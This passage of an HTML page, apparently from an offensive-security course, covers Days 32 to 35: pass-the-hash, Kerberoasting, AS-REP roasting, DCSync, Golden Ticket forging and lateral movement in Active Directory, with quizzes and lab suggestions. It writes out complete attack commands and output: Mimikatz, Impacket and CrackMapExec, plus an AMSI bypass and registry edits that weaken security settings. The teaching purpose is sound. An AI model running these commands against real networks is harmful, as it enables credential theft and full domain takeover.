+<span class="co"># ── PtH with CrackMapExec (fastest) ─────────────────────────</span>
+<span class="pr">kali$</span> <span class="cm">crackmapexec smb 10.10.10.20 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c</span>
+<span class="hl2">SMB  10.10.10.20  445  WIN-WS01  [+] CORP\Administrator:8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)</span>
+
+<span class="co"># Execute command via PtH:</span>
+<span class="pr">kali$</span> <span class="cm">crackmapexec smb 10.10.10.20 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x "whoami"</span>
+<span class="hl2">corp\administrator</span>
+
+<span class="co"># Spray hash across entire subnet (find all machines with same password):</span>
+<span class="pr">kali$</span> <span class="cm">crackmapexec smb 10.10.10.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c</span>
+<span class="hl2">[+] 10.10.10.5  (Pwn3d!)    ← admin on DC!
+[+] 10.10.10.20 (Pwn3d!)    ← admin on workstation
+[+] 10.10.10.50 (Pwn3d!)</span>    <span class="hc">← same local admin password on 3 machines</span>
+
+<span class="co"># ── PtH with Impacket psexec (full shell) ────────────────────</span>
+<span class="pr">kali$</span> <span class="cm">impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@10.10.10.20</span>
+<span class="hl2">Microsoft Windows [Version 10.0.17763.1577]
+C:\Windows\system32> whoami
+nt authority\system</span>
+
+<span class="co"># ── PtH in Mimikatz (inject token on current machine) ────────</span>
+<span class="ha">mimikatz #</span> <span class="cm">sekurlsa::pth /user:Administrator /domain:CORP.LOCAL /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe</span>
+<span class="co"># Opens a new cmd.exe with that user's credentials injected</span></div>
+  </div>
+
+  <div class="slbl">// DAY 32 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">Mimikatz <code>sekurlsa::logonpasswords</code> shows Administrator's NTLM hash but the wdigest password field shows <code>(null)</code>. What does this mean and does it stop your attack?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','NTLM hash being null would mean you have nothing. But the NTLM hash is present — only the wdigest plaintext is null.')"><span class="qk">A</span> The NTLM hash is also null — the account has no password</div>
+      <div class="qo" onclick="qa(this,'wrong','A null wdigest means WDigest is disabled (which is correct security practice since KB2871997 in 2014). It doesn\'t mean the account is protected from all attacks.')"><span class="qk">B</span> WDigest is disabled so the account cannot be attacked at all</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! WDigest is disabled — Microsoft disabled it by default after 2014 because Mimikatz was extracting cleartext passwords. The wdigest field shows null because Windows no longer stores credentials in a reversible WDigest format. But this does NOT stop your attack: (1) The NTLM hash is still present and valid for Pass-the-Hash attacks — no cracking needed. (2) If the password is weak enough, crack it offline with Hashcat. (3) Kerberos tickets are still extractable for Pass-the-Ticket. (4) On older systems or if an admin re-enables WDigest (reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1) then cleartext appears on next login. The NTLM hash alone is sufficient for most lateral movement.')"><span class="qk">C</span> WDigest is disabled (good security practice) — cleartext passwords aren\'t stored. But the NTLM hash is still present and fully usable for Pass-the-Hash without needing plaintext</div>
+      <div class="qo" onclick="qa(this,'wrong','Running mimikatz again won\'t change WDigest being disabled — it\'s a system configuration, not a transient state.')"><span class="qk">D</span> Run mimikatz again immediately after a user logs in — WDigest appears temporarily</div>
+    </div>
+    <div class="qfb" id="q3"></div>
+  </div>
+</div><!-- /p3 -->
+
+
+<!-- ═══════════════ DAY 33 ═══════════════ -->
+<div class="pnl" id="p4">
+  <div class="dh">
+    <div class="dnum">33</div>
+    <div class="dinfo">
+      <h2>ACTIVE DIRECTORY ATTACKS</h2>
+      <p><span class="stag sth">THEORY</span><span class="stag slb">LAB</span> Kerberoasting · AS-REP Roasting · DCSync · Golden Ticket · Silver Ticket</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 5 PROGRESS — DAY 33 OF 35</div><div class="pbt"><div class="pbf" style="width:94%"></div></div></div>
+
+  <div class="note ni">
+    <div class="nico">🏰</div>
+    <p><strong>Active Directory attacks are the crown jewels of offensive security.</strong> Kerberoasting and DCSync are used in virtually every real-world domain compromise. They exploit fundamental design decisions in the Kerberos protocol and AD replication — not implementation bugs. Understanding them makes you both a better attacker and a far better defender.</p>
+  </div>
+
+  <div class="slbl">// 33.1 — KERBEROS REFRESHER: THE TICKET SYSTEM</div>
+  <div class="kerb-diag">
+    <div class="kd-title">// KERBEROS AUTHENTICATION FLOW — AND WHERE ATTACKS LIVE</div>
+<span class="kd-client">CLIENT</span>                     <span class="kd-dc">DOMAIN CONTROLLER (KDC)</span>          <span class="kd-svc">SERVICE (SQL Server)</span>
+
+<span class="kd-client">User logs in</span>
+   │ AS-REQ (username)      ──────────────────────► │
+   │ ◄────────────────────────────────── AS-REP     │
+   │   TGT encrypted with krbtgt hash               │   <span class="kd-attack">← AS-REP Roasting: no preauth → hash offline crackable</span>
+   │
+   │ TGS-REQ (TGT + SPN)  ──────────────────────► │
+   │ ◄──────────────────────────────── TGS-REP      │
+   │   Service Ticket (TGS) encrypted with          │   <span class="kd-attack">← Kerberoasting: TGS encrypted with service account hash</span>
+   │   service account's NTLM hash                  │   <span class="kd-attack">   → request TGS for any SPN → crack offline</span>
+   │
+   │ AP-REQ (TGS ticket)  ─────────────────────────────────────────────► │
+   │                                                                       │ Decrypts with own hash
+   │ ◄───────────────────────────────────────────────────── AP-REP (OK)   │
+   │ Access granted
+
+<span class="kd-attack">Golden Ticket: forge TGT using krbtgt hash → unlimited access to anything, any time
+Silver Ticket: forge TGS using service account hash → access specific service without touching DC</span>
+  </div>
+
+  <div class="slbl">// 33.2 — KERBEROASTING</div>
+  <div class="card">
+    <div class="clbl">OFFLINE CRACKING OF SERVICE ACCOUNT PASSWORDS</div>
+    <p>Any authenticated domain user can request a Kerberos service ticket (TGS) for any SPN (Service Principal Name) — this is by design. The TGS is encrypted with the service account's NTLM hash. You take it offline and crack it. Service accounts often have weak passwords and high privileges (SQL service accounts, backup agents, etc.).</p>
+  </div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">KERBEROASTING — FULL ATTACK CHAIN</div></div>
+    <div class="tbody"><span class="co"># ── Step 1: Find Kerberoastable accounts (have SPNs set) ─────</span>
+<span class="pr">kali$</span> <span class="cm">impacket-GetUserSPNs -dc-ip 10.10.10.5 CORP.LOCAL/john.smith:Password123 -outputfile kerberoast.txt</span>
+<span class="ha">ServicePrincipalName                Name       MemberOf                  PasswordLastSet
+----------------------------        ---------  ------------------------  ---------------
+MSSQLSvc/sql01.corp.local:1433      svc-sql    CORP\DB-Admins            2021-03-12      ← weak pw likely
+HTTP/sharepoint.corp.local          svc-sp     CORP\SharePoint-Admins    2019-08-01      ← very old!</span>
+
+<span class="co"># ── Step 2: Request TGS hashes ───────────────────────────────</span>
+<span class="hc">$krb5tgs$23$*svc-sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$a4f3b2...</span>
+<span class="hc">$krb5tgs$23$*svc-sp$CORP.LOCAL$HTTP/sharepoint.corp.local*$c8d1e4...</span>
+<span class="co"># Hashes are TGS-REP (etype 23 = RC4) — crackable with hashcat mode 13100</span>
+
+<span class="co"># ── Step 3: Crack offline ─────────────────────────────────────</span>
+<span class="pr">kali$</span> <span class="cm">hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r OneRuleToRuleThemAll.rule</span>
+<span class="hl2">$krb5tgs$23$*svc-sql$...:SqlServer2019!</span>    <span class="hc">← svc-sql password found!</span>
+<span class="hl2">$krb5tgs$23$*svc-sp$...:Sharepoint1</span>       <span class="hc">← svc-sp password found!</span>
+
+<span class="co"># ── Step 4: Use the cracked credentials ──────────────────────</span>
+<span class="pr">kali$</span> <span class="cm">crackmapexec smb 10.10.10.0/24 -u svc-sql -p 'SqlServer2019!'</span>
+<span class="hl2">[+] 10.10.10.5 CORP\svc-sql:SqlServer2019! (Pwn3d!)</span>  <span class="hc">← svc-sql is admin on DC!</span>
+
+<span class="co"># ── BloodHound to find Kerberoastable accounts ───────────────</span>
+<span class="co"># Pre-built query: "List all Kerberoastable Accounts"
+# Prioritize those with "MemberOf" pointing to admin groups!</span></div>
+  </div>
+
+  <div class="slbl">// 33.3 — AS-REP ROASTING</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">AS-REP ROASTING — NO CREDENTIALS REQUIRED</div></div>
+    <div class="tbody"><span class="co"># AS-REP Roasting: accounts with "Don't require Kerberos preauthentication" enabled
+# You can request their AS-REP hash WITHOUT valid credentials — offline crackable</span>
+
+<span class="co"># Find AS-REP roastable accounts:</span>
+<span class="pr">kali$</span> <span class="cm">impacket-GetNPUsers CORP.LOCAL/ -dc-ip 10.10.10.5 -no-pass -usersfile users.txt</span>
+<span class="hc">$krb5asrep$23$john.smith@CORP.LOCAL:8e4f2b3c1a...</span>   <span class="hc">← no credentials needed!</span>
+
+<span class="co"># Crack the AS-REP hash:</span>
+<span class="pr">kali$</span> <span class="cm">hashcat -m 18200 asrep_hash.txt rockyou.txt</span>
+<span class="hl2">$krb5asrep$23$john.smith...:Winter2024!</span></div>
+  </div>
+
+  <div class="slbl">// 33.4 — DCSYNC: MIMICKING A DOMAIN CONTROLLER</div>
+  <div class="card">
+    <div class="clbl">THE ULTIMATE AD ATTACK</div>
+    <p>Domain Controllers replicate with each other using MS-DRSR protocol. DCSync mimics a DC requesting replication — it dumps <span class="hl">ALL password hashes</span> in the domain without touching disk or running code on the DC. Requires <span class="hl">Replicating Directory Changes</span> rights (Domain Admins, NTDS.DIT sync accounts, or misassigned replication rights in BloodHound).</p>
+  </div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">DCSYNC — DUMP ENTIRE DOMAIN HASH DATABASE</div></div>
+    <div class="tbody"><span class="co"># Via Mimikatz (on compromised machine with DA rights):</span>
+<span class="ha">mimikatz #</span> <span class="cm">lsadump::dcsync /domain:CORP.LOCAL /user:krbtgt</span>
+<span class="ham">Object RDN           : krbtgt</span>
+<span class="hc">Credentials:
+  Hash NTLM: 9e4a2b1f6d3c8a7b...</span>   <span class="hc">← krbtgt hash = Golden Ticket material</span>
+
+<span class="ha">mimikatz #</span> <span class="cm">lsadump::dcsync /domain:CORP.LOCAL /all /csv</span>
+<span class="hl2">Administrator  500  8846f7eaee8fb117ad06bdd830b7586c  512
+krbtgt         502  9e4a2b1f6d3c8a7b4e5d2a1c3f8b6e9d  514
+john.smith    1104  3d4f8e2b1a7c9f5d2e8b3a4c6f9d1e7b  512
+jane.doe      1105  7b2e9f4d1c6a8e3b5f7d2a9c4e1b8f3d  512</span>
+<span class="co"># Every domain account hash — entire AD in seconds</span>
+
+<span class="co"># Via Impacket (from Kali — no code on DC required):</span>
+<span class="pr">kali$</span> <span class="cm">impacket-secretsdump -just-dc CORP.LOCAL/Administrator:SuperSecret2024!@10.10.10.5</span>
+<span class="hl2">CORP.LOCAL\Administrator:500:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+CORP.LOCAL\krbtgt:502:aad3b435b51404ee:9e4a2b1f6d3c8a7b:::
+CORP.LOCAL\john.smith:1104:aad3b435b51404ee:3d4f8e2b1a7c9f5d:::</span>
+<span class="co"># Crack offline or use Pass-the-Hash on all of them</span></div>
+  </div>
+
+  <div class="slbl">// 33.5 — GOLDEN TICKET: FORGING DOMAIN ADMIN FOREVER</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">GOLDEN TICKET — THE ULTIMATE PERSISTENCE</div></div>
+    <div class="tbody"><span class="co"># Golden Ticket: forge a TGT using krbtgt hash → valid for any user, any time
+# Even if ALL user passwords are changed — golden ticket still works
+# Requires: krbtgt NTLM hash + Domain SID (both from DCSync)</span>
+
+<span class="co"># Get domain SID:</span>
+<span class="pr">C:\></span> <span class="cm">whoami /user</span>
+<span class="ha">CORP\Administrator  S-1-5-21-3847380843-1259432054-2897748891-500</span>
+<span class="co"># Domain SID = S-1-5-21-3847380843-1259432054-2897748891 (without last -500)</span>
+
+<span class="co"># Forge Golden Ticket in Mimikatz:</span>
+<span class="ha">mimikatz #</span> <span class="cm">kerberos::golden /user:FakeAdmin /domain:CORP.LOCAL /sid:S-1-5-21-3847380843-1259432054-2897748891 /krbtgt:9e4a2b1f6d3c8a7b4e5d2a1c3f8b6e9d /ptt</span>
+<span class="hl2">Golden ticket for 'FakeAdmin @ CORP.LOCAL' successfully submitted for current session</span>
+<span class="co"># /ptt = Pass-the-Ticket (inject into current session)
+# FakeAdmin doesn't need to be a real user!
+# This ticket is valid for 10 years by default</span>
+
+<span class="co"># Now access anything in the domain:</span>
+<span class="pr">C:\></span> <span class="cm">dir \\WIN-DC01\C$</span>    <span class="co"># Browse DC filesystem</span>
+<span class="pr">C:\></span> <span class="cm">psexec \\WIN-DC01 cmd.exe</span>   <span class="co"># Shell on DC</span>
+<span class="hl2">Microsoft Windows [Version Server 2019]
+C:\Windows\system32> whoami
+corp\fakeadmin    ← a user that doesn't exist having Domain Admin access</span>
+
+<span class="co"># Defense: The ONLY fix is resetting krbtgt password TWICE
+# (tickets persist for their lifetime — usually 10 hours by default TGT, 10 years if Golden)</span></div>
+  </div>
+
+  <div class="slbl">// DAY 33 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You have Domain Admin. You run DCSync and obtain the krbtgt hash. The security team detects your activity, changes every user's password including Administrator, and you lose your shell. You still have the krbtgt hash. Can you regain access, and how?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','If all passwords changed and your shell is gone, credential stuffing the new passwords won\'t work — you don\'t know the new passwords.')"><span class="qk">A</span> No — changing all passwords means the krbtgt hash is now invalid too</div>
+      <div class="qo" onclick="qa(this,'wrong','You can\'t SSH to a Windows DC by default, and you need valid credentials for that anyway — which you no longer have.')"><span class="qk">B</span> No — regain access by SSH-ing to the DC with the Administrator hash</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! The Golden Ticket attack. The krbtgt account hash is what signs ALL Kerberos tickets in the domain. Even after resetting every user\'s password, the krbtgt hash you have is still valid because the security team only reset USER passwords, not the krbtgt service account password (or they reset it only once — it must be reset TWICE because DC replication keeps both old and new hashes). You forge a Golden Ticket: mimikatz kerberos::golden /user:Administrator /domain:CORP.LOCAL /sid:[sid] /krbtgt:[hash] /ptt — and you\'re Domain Admin again with a forged ticket for a user that can be entirely fictional. This is why incident response teams MUST reset krbtgt twice, 10+ hours apart, after any suspected Domain compromise.')"><span class="qk">C</span> Yes — forge a Golden Ticket using the krbtgt hash. It bypasses all password changes because it forges the authentication ticket itself, not credentials</div>
+      <div class="qo" onclick="qa(this,'wrong','Kerberoasting requires network access to a domain-joined machine or the DC — without a shell or credentials you can\'t request TGS tickets.')"><span class="qk">D</span> Yes — use the krbtgt hash to Kerberoast all service accounts and crack their passwords</div>
+    </div>
+    <div class="qfb" id="q4"></div>
+  </div>
+</div><!-- /p4 -->
+
+
+<!-- ═══════════════ DAY 34 ═══════════════ -->
+<div class="pnl" id="p5">
+  <div class="dh">
+    <div class="dnum">34</div>
+    <div class="dinfo">
+      <h2>LATERAL MOVEMENT</h2>
+      <p><span class="stag stl">TOOL</span><span class="stag slb">LAB</span> PSExec · WMI · RDP Abuse · BloodHound Paths · CrackMapExec</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 5 PROGRESS — DAY 34 OF 35</div><div class="pbt"><div class="pbf" style="width:97%"></div></div></div>
+
+  <div class="note ni">
+    <div class="nico">↔️</div>
+    <p><strong>Lateral movement is how attackers spread from a beachhead to high-value targets.</strong> Compromising a helpdesk workstation is the beginning. The end goal is the Domain Controller, the financial system, or the source code repository. Each hop uses harvested credentials, token impersonation, or forged tickets to authenticate to the next machine. The BloodHound path you mapped in Week 3 becomes your attack roadmap here.</p>
+  </div>
+
+  <div class="slbl">// 34.1 — LATERAL MOVEMENT TECHNIQUES COMPARED</div>
+  <table class="tbl">
+    <tr><th>TECHNIQUE</th><th>PROTOCOL</th><th>REQUIRES</th><th>LEAVES LOGS</th><th>TOOL</th></tr>
+    <tr><td><span class="hl">PSExec</span></td><td>SMB (445)</td><td>Admin share access (C$)</td><td><span class="hcr">Yes — service created in Event Log</span></td><td>impacket-psexec, CrackMapExec</td></tr>
+    <tr><td><span class="hl">WMI</span></td><td>DCOM (135+)</td><td>Local admin on target</td><td><span class="ham2">Minimal</span> — no service created</td><td>impacket-wmiexec, CrackMapExec</td></tr>
+    <tr><td><span class="hl">WinRM</span></td><td>HTTP/S (5985/5986)</td><td>Remote Management Users group</td><td><span class="ham2">Minimal</span></td><td>evil-winrm</td></tr>
+    <tr><td><span class="hl">RDP</span></td><td>RDP (3389)</td><td>Remote Desktop Users group</td><td><span class="hcr">Yes — logon events</span></td><td>xfreerdp, Restricted Admin Mode for PtH</td></tr>
+    <tr><td><span class="hl">Pass-the-Hash via SMB</span></td><td>SMB (445)</td><td>NTLM hash + local admin</td><td><span class="ham2">Minimal</span></td><td>CrackMapExec, Impacket</td></tr>
+    <tr><td><span class="hlm">Pass-the-Ticket</span></td><td>Kerberos (88)</td><td>Valid Kerberos ticket</td><td><span class="hlm">Minimal</span> — looks like normal Kerberos</td><td>Mimikatz, Rubeus</td></tr>
+  </table>
+
+  <div class="slbl">// 34.2 — LATERAL MOVEMENT TOOLS IN ACTION</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">LATERAL MOVEMENT — PRACTICAL COMMANDS</div></div>
+    <div class="tbody"><span class="co"># Context: We have john.smith's NTLM hash from Mimikatz on WORKSTATION-01
+# BloodHound shows john.smith is Local Admin on WORKSTATION-02 and SERVER-FS01</span>
+
+<span class="co"># ── WMIEXEC (stealthy — no service created) ──────────────────</span>
+<span class="pr">kali$</span> <span class="cm">impacket-wmiexec -hashes :3d4f8e2b1a7c9f5d2e8b3a4c6f9d1e7b CORP/john.smith@10.10.10.20</span>
+<span class="hl2">C:\> whoami
+corp\john.smith</span>
+
+<span class="co"># ── EVIL-WINRM (best interactive shell for Windows) ─────────</span>
+<span class="pr">kali$</span> <span class="cm">evil-winrm -i 10.10.10.20 -u john.smith -H 3d4f8e2b1a7c9f5d2e8b3a4c6f9d1e7b</span>
+<span class="hl2">Evil-WinRM shell v3.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\john.smith\Documents></span>
+
+<span class="co"># Upload tools, run scripts, use built-in bypass features</span>
+<span class="hl2">*Evil-WinRM*</span> <span class="cm">upload /opt/winpeas.exe</span>
+<span class="hl2">*Evil-WinRM*</span> <span class="cm">Bypass-4MSI   </span>     <span class="co"># Bypass AMSI (antivirus script scanning)</span>
+
+<span class="co"># ── RDP with Pass-the-Hash (Restricted Admin Mode) ──────────</span>
+<span class="pr">kali$</span> <span class="cm">xfreerdp /v:10.10.10.20 /u:Administrator /pth:8846f7eaee8fb117ad06bdd830b7586c /cert-ignore</span>
+<span class="co"># Restricted Admin Mode must be enabled on target:
+# reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</span>
+
+<span class="co"># ── CRACKMAPEXEC — spray credentials across subnet ──────────</span>
+<span class="pr">kali$</span> <span class="cm">crackmapexec smb 10.10.10.0/24 -u john.smith -H 3d4f8e2b1a7c9f5d -d CORP.LOCAL --shares</span>
+<span class="hl2">[+] 10.10.10.20 CORP\john.smith (Pwn3d!)
+[+] 10.10.10.50 CORP\john.smith (Pwn3d!)</span>
+
+<span class="co"># Dump SAM from all pwned machines in one command:</span>
+<span class="pr">kali$</span> <span class="cm">crackmapexec smb 10.10.10.0/24 -u john.smith -H 3d4f8e2b1a7c9f5d --sam</span>
+<span class="hl2">CORP\Administrator:8846f7eaee8fb117ad06bdd830b7586c   ← local admin hash from each</span></div>
+  </div>
+
+  <div class="slbl">// 34.3 — FOLLOWING THE BLOODHOUND PATH</div>
+  <div class="lat-map">
+    <div class="lat-title">// LATERAL MOVEMENT FOLLOWING BLOODHOUND ATTACK PATH</div>
+    <div class="lat-nodes">
+<span class="ln-owned">[ OWNED: helpdesk-pc01 ]</span> <span class="ln-edge">─── john.smith logs in here ──►</span> <span class="ln-cred">Mimikatz → john.smith hash</span>
+         │
+         │ <span class="ln-path">BloodHound: john.smith → MemberOf → IT-HELPDESK</span>
+         │ <span class="ln-path">IT-HELPDESK → LocalAdmin → workstation-02</span>
+         ▼
+<span class="ln-target">[ TARGET: workstation-02 ]</span> <span class="ln-edge">─── evil-winrm -H john.smith.hash ──►</span> <span class="ln-cred">Mimikatz → jane.doe hash</span>
+         │
+         │ <span class="ln-path">BloodHound: jane.doe → MemberOf → Domain Admins</span>
+         ▼
+<span class="ln-target">[ TARGET: DC01.corp.local ]</span> <span class="ln-edge">─── psexec -H jane.doe.hash ───────►</span> <span class="ln-owned">DOMAIN ADMIN SHELL</span>
+         │
+         │ DCSync
+         ▼
+<span class="ln-owned">ALL DOMAIN HASHES</span> <span class="ln-edge">→</span> <span class="ln-owned">GOLDEN TICKET</span> <span class="ln-edge">→</span> <span class="ln-owned">PERSISTENT DOMAIN CONTROL</span>
+    </div>
+  </div>
+
+  <div class="slbl">// DAY 34 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You have local admin on a machine via Pass-the-Hash. BloodHound shows a Domain Admin user has an active session on this machine. How do you leverage this to get Domain Admin access without knowing their password or hash?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','Social engineering is not a technical technique and wouldn\'t be appropriate in a pentest scenario testing technical controls.')"><span class="qk">A</span> Social engineer the Domain Admin into giving you their password</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Token impersonation via Mimikatz or Meterpreter\'s incognito module. When a Domain Admin logs into a machine (even remotely via RDP or running a script), their authentication token exists in memory on that machine. Steps: (1) Get SYSTEM on the machine (you already have local admin, use token impersonation). (2) In Mimikatz: sekurlsa::logonpasswords — if WDigest is enabled, cleartext appears. If not, you get the NTLM hash. (3) In Meterpreter: load incognito → list_tokens -u → impersonate_token "CORP\\DomainAdmin" — you steal their live token and operate AS them. (4) Alternatively: ps shows their process (e.g., explorer.exe running as DomainAdmin) → migrate into their process → you inherit their token. This is why Domain Admins should NEVER log into low-trust machines — their tokens become available to anyone with local admin on that machine.')"><span class="qk">B</span> Use Mimikatz or Meterpreter incognito to steal the Domain Admin\'s live authentication token from memory — they\'re logged in so their token exists on this machine</div>
+      <div class="qo" onclick="qa(this,'wrong','Kerberoasting requires network access to the DC to request TGS tickets, and it targets service accounts with SPNs — not active user sessions on the current machine.')"><span class="qk">C</span> Kerberoast the Domain Admin\'s account hash from this machine</div>
+      <div class="qo" onclick="qa(this,'wrong','Waiting for them to reuse a password is passive and might take days — the token is available right now in memory.')"><span class="qk">D</span> Monitor their activity and wait for them to reuse the password on another service</div>
+    </div>
+    <div class="qfb" id="q5"></div>
+  </div>
+</div><!-- /p5 -->
+
+
+<!-- ═══════════════ DAY 35 ═══════════════ -->
+<div class="pnl" id="p6">
+  <div class="dh">
+    <div class="dnum">35</div>
+    <div class="dinfo">
+      <h2>FULL ATTACK CHAIN + PHASE 3 WEEK 5 CAPSTONE</h2>
+      <p><span class="stag slb">LAB</span> End-to-End AD Compromise · MITRE ATT&CK Mapping · Week 5 Review</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 5 — COMPLETE ✓</div><div class="pbt"><div class="pbf" style="width:100%"></div></div></div>
+
+  <div class="note ng">
+    <div class="nico">🏆</div>
+    <p><strong>Week 5 complete.</strong> You've covered the full post-exploitation lifecycle — from landing as a low-privilege user to forging Golden Tickets that give permanent domain control. Today maps your techniques to MITRE ATT&CK and runs a complete simulated AD compromise.</p>
+  </div>
+
+  <div class="slbl">// 35.1 — MITRE ATT&CK MAPPING — WEEK 5 TECHNIQUES</div>
+  <div class="mitre-grid">
+    <div class="mitre-card">
+      <div class="mitre-id">T1548.001</div>
+      <div class="mitre-name">SUID / SGID Abuse</div>
+      <div class="mitre-desc">Abusing SUID-set binaries on Linux for privilege escalation. Covered Day 29.</div>
+    </div>
+    <div class="mitre-card">
+      <div class="mitre-id">T1053.005</div>
+      <div class="mitre-name">Scheduled Task / Job</div>
+      <div class="mitre-desc">Creating scheduled tasks for persistence and privilege escalation. Covered Days 29-31.</div>
+    </div>
+    <div class="mitre-card">
+      <div class="mitre-id">T1134.001</div>
+      <div class="mitre-name">Token Impersonation</div>
+      <div class="mitre-desc">Stealing and impersonating Windows access tokens (Potato attacks, Mimikatz incognito). Day 30, 34.</div>
+    </div>
+    <div class="mitre-card">
+      <div class="mitre-id">T1003.001</div>
+      <div class="mitre-name">LSASS Memory Dumping</div>
+      <div class="mitre-desc">Dumping credentials from LSASS memory using Mimikatz sekurlsa::logonpasswords. Day 32.</div>
+    </div>
+    <div class="mitre-card">
+      <div class="mitre-id">T1558.003</div>
+      <div class="mitre-name">Kerberoasting</div>
+      <div class="mitre-desc">Requesting TGS tickets for service accounts and cracking offline. Day 33.</div>
+    </div>
+    <div class="mitre-card">
+      <div class="mitre-id">T1550.002</div>
+      <div class="mitre-name">Pass the Hash</div>
+      <div class="mitre-desc">Using NTLM hashes for authentication without cracking. CrackMapExec, Impacket. Day 32, 34.</div>
+    </div>
+    <div class="mitre-card">
+      <div class="mitre-id">T1003.006</div>
+      <div class="mitre-name">DCSync</div>
+      <div class="mitre-desc">Mimicking DC replication to dump all domain hashes. Requires replication rights. Day 33.</div>
+    </div>
+    <div class="mitre-card">
+      <div class="mitre-id">T1558.001</div>
+      <div class="mitre-name">Golden Ticket</div>
+      <div class="mitre-desc">Forging TGTs using krbtgt hash for persistent domain access. Day 33.</div>
+    </div>
+    <div class="mitre-card">
+      <div class="mitre-id">T1021.002</div>
+      <div class="mitre-name">SMB/Windows Admin Shares</div>
+      <div class="mitre-desc">Lateral movement via SMB admin shares (C$, IPC$). PSExec, CrackMapExec. Day 34.</div>
+    </div>
+  </div>
+
+  <div class="slbl">// 35.2 — WEEK 5 COMPLETE REVIEW</div>
+  <table class="tbl">
+    <tr><th>DAY</th><th>TOPIC</th><th>KEY TECHNIQUE</th><th>TOOL</th></tr>
+    <tr><td>29</td><td>Linux PrivEsc</td><td>SUID GTFOBins, sudo misconfig, cron hijack, kernel exploits</td><td>linpeas.sh, GTFOBins</td></tr>
+    <tr><td>30</td><td>Windows PrivEsc</td><td>Token impersonation (Potato), unquoted paths, AlwaysInstallElevated</td><td>winpeas, GodPotato, PrintSpoofer</td></tr>
+    <tr><td>31</td><td>Post-Exploitation I</td><td>Internal recon, persistence (registry/cron), pivoting via routes</td><td>Meterpreter, proxychains</td></tr>
+    <tr><td>32</td><td>Mimikatz</td><td>LSASS dump, Pass-the-Hash, Pass-the-Ticket</td><td>mimikatz, CrackMapExec, Impacket</td></tr>
+    <tr><td>33</td><td>AD Attacks</td><td>Kerberoasting, AS-REP Roasting, DCSync, Golden Ticket</td><td>GetUserSPNs, Impacket, Mimikatz</td></tr>
+    <tr><td>34</td><td>Lateral Movement</td><td>PSExec, WMI, WinRM, RDP-PtH, BloodHound path following</td><td>evil-winrm, wmiexec, CrackMapExec</td></tr>
+    <tr><td>35</td><td>Full Chain</td><td>End-to-end: foothold → privesc → credential dump → lateral → DA</td><td>Everything</td></tr>
+  </table>
+
+  <div class="slbl">// 35.3 — CAPSTONE LABS</div>
+  <div class="card">
+    <div class="clbl">LAB 1 — TRYHACKME: AD ATTACK CHAIN</div>
+    <ul class="ck">
+      <li><strong>"Attacktive Directory"</strong> — Full AD lab: AS-REP Roasting → Kerberoasting → SMB enumeration → domain compromise. TryHackMe's best AD room.</li>
+      <li><strong>"Post-Exploitation Basics"</strong> — Meterpreter advanced usage, persistence, pivoting exercises.</li>
+      <li><strong>"Linux PrivEsc"</strong> — 10 different escalation paths in one machine. Find and exploit all of them.</li>
+      <li><strong>"Windows PrivEsc"</strong> — Token impersonation, unquoted paths, DLL hijacking in a guided but challenging lab.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <div class="clbl">LAB 2 — HACKTHEBOX: ACTIVE DIRECTORY MACHINES</div>
+    <ul class="ck">
+      <li><strong>"Active"</strong> (Retired, Easy) — Kerberoasting against an AD environment. Classic. Get user via SMB share → Kerberoast Administrator → Domain Admin.</li>
+      <li><strong>"Forest"</strong> (Retired, Easy) — AS-REP Roasting + Exchange permissions abuse → DCSync → DA. Covers Days 33 and 34 perfectly.</li>
+      <li><strong>"Sauna"</strong> (Retired, Easy) — AS-REP Roasting + Windows PrivEsc + DCSync. Excellent all-round AD machine.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <div class="clbl">LAB 3 — BUILD YOUR OWN AD LAB</div>
+    <ul class="ck">
+      <li>Set up a Windows Server 2019 VM, promote to Domain Controller, create 10 user accounts with varying passwords.</li>
+      <li>Join a Windows 10 VM to the domain. Create service accounts with SPNs set (for Kerberoasting).</li>
+      <li>Deliberately misconfigure: one user with no Kerberos preauth, one SUID-equivalent service running as SYSTEM.</li>
+      <li>From a third VM (Kali), run the full attack chain: enumerate → AS-REP roast → Kerberoast → lateral movement → DCSync → Golden Ticket.</li>
+      <li>Document everything in a report format — this is your PNPT/OSCP preparation.</li>
+    </ul>
+  </div>
+
+  <div class="slbl">// WEEK 6 PREVIEW</div>
+  <div class="two">
+    <div class="card">
